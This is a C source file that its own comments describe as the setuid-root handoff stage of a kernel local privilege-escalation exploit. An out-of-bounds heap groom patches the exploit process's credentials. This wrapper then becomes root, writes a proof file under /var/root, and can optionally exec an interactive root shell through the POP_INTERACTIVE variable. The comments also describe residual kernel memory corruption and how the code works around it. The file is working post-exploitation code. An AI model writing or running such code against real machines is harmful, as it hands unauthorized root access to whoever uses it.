/*
 * suidwrap.c - setuid-root handoff for a NON-CRASHING root proof / shell.
 *
 * The exploit child reaches uid 0 by patching ONLY its own (held) cred, then
 * chown(0,0)+chmod(04755)'s this wrapper and idles. A fresh uid-501 process
 * exec'ing this wrapper gets a LEGITIMATE root cred via the setuid path (no
 * patched-cred / SMR corruption), so it can run as root with the VM alive.
 *
 * IMPORTANT: the OOB groom leaves residual collateral corruption in kernel
 * memory. Heavy VM ops (fork/exec) can hit it -> Kernel data abort. So the
 * root PROOF here uses NON-FORKING syscalls only (open/write/getuid). An
 * interactive shell (which must fork/exec) is opt-in via POP_INTERACTIVE.
 */
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <time.h>

int
main(int argc, char **argv)
{
	(void)argc;
	(void)argv;
	setgid(0);
	setuid(0);
	dprintf(2, "[suidwrap] after setuid: uid=%d euid=%d gid=%d egid=%d\n",
	    getuid(), geteuid(), getgid(), getegid());
	if (getuid() != 0) {
		dprintf(2, "[suidwrap] NOT root - setuid not honored. Handoff failed.\n");
		return 1;
	}

	/* NON-FORKING root proof: writing under /var/root requires uid 0. */
	int fd = open("/var/root/claude_shell_proof", O_WRONLY | O_CREAT | O_TRUNC, 0600);
	dprintf(2, "[suidwrap] open(/var/root/claude_shell_proof)=%d%s\n",
	    fd, fd < 0 ? " (would be EACCES for non-root)" : " (ROOT-ONLY WRITE OK)");
	if (fd >= 0) {
		const char m[] = "claude reslide LPE: NON-CRASHING root via setuid handoff\n";
		ssize_t w = write(fd, m, sizeof(m) - 1);
		dprintf(2, "[suidwrap] wrote %zd bytes to /var/root (root-only)\n", w);
		close(fd);
	}

	/* Stay alive as root WITHOUT forking, so we can confirm the VM survives a
	 * running root process. Pure syscalls; no fork/exec to trip collateral. */
	dprintf(2, "[suidwrap] === ROOT (uid 0), proving VM stays alive (no fork) ===\n");
	for (int i = 0; i < 6; i++) {
		struct timespec ts = { 2, 0 };
		nanosleep(&ts, NULL);
		dprintf(2, "[suidwrap] still root + VM alive, t=%ds (uid=%d)\n", (i + 1) * 2, getuid());
	}
	dprintf(2, "[suidwrap] === SURVIVED 12s as root, no crash ===\n");

	/* Interactive shell forks/execs (may hit residual collateral) - opt-in only. */
	if (getenv("POP_INTERACTIVE") != NULL) {
		dprintf(2, "[suidwrap] POP_INTERACTIVE set: exec'ing /bin/sh -i (fork/exec risk)\n");
		execl("/bin/sh", "sh", "-i", (char *)0);
		perror("[suidwrap] execl");
	}
	return 0;
}
